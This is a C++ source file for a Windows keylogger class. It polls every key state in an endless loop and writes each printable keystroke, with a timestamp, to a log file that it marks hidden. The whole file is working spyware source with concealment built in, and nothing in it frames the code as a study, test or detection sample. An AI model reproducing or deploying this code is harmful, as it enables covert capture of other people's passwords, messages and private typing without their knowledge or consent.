#include "KeyLogger.hpp"
#include <iostream>
#include <thread> // For sleep
#include <windows.h> // Key press detection on windows


KeyLogger::KeyLogger(const std::string& filePath) : logFile(filePath)
{
    // Open the logging file
    loggingFile.open(logFile, std::ios::app);
    if(loggingFile.is_open())
    {
        // Create the hidden file
        makeFileHidden();
    }
    else
    {
        std::cerr << "Error opening log file" << std::endl;
    }
}

KeyLogger::~KeyLogger()
{
    // Close the file
    if(loggingFile.is_open())
    {
        loggingFile.close();
    }
}

void KeyLogger::makeFileHidden()
{
    // Convert std::string to std::wstring 
    std::wstring wideLogFile(logFile.begin(), logFile.end());
    
    // Set the file to hidden
    DWORD at = GetFileAttributesW(wideLogFile.c_str());
    if(at != INVALID_FILE_ATTRIBUTES && !(at && FILE_ATTRIBUTE_DIRECTORY))
    {
        // Make hidden
        SetFileAttributesW(wideLogFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}

void KeyLogger::logKey(int key)
{
    // Get timestamp
    auto lastPressTime = lastKeyPress[key];
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(lastPressTime.time_since_epoch()).count();

    // Convert key to string
    std::string keyStr = std::to_string(key);

    if(key >= 32 && key <= 126)
    {
        // Printable ascii chars
        keyStr = static_cast<char>(key);
        if (loggingFile.is_open()) 
        {
            // Log the key along with the timestamp from lastKeyPress
            loggingFile << duration << "\t" << keyStr << std::endl;
        }
        else 
        {
            // In case the file is not open
            std::cerr << "Error: Unable to write to log file!" << std::endl;
        }
    }
    
}

void KeyLogger::run()
{
    while(true)
    {
        for(int key = 0; key <= 256; key++)
        {
            if(GetAsyncKeyState(key) & 0x8000) // If The key is pressed
            {
                // Get current time
                auto now = std::chrono::steady_clock::now();

                // If the key is not in lastKeyPress map log it
                if(lastKeyPress.find(key) == lastKeyPress.end())
                {
                    lastKeyPress[key] = now;
                    logKey(key); // Log key press
                }
                else
                {
                    // Calculate time diff between presses
                    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - lastKeyPress[key]);

                    if(duration.count() > 200)
                    {
                        // Enough time has passed we can assume that its another press
                        lastKeyPress[key] = now;
                        logKey(key); // Log key press
                    }

                }
            }
            else
            {
                // If the key is released
                if(lastKeyPress.find(key) != lastKeyPress.end())
                {
                    lastKeyPress.erase(key);
                }
            }
        }
        // Small delay
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}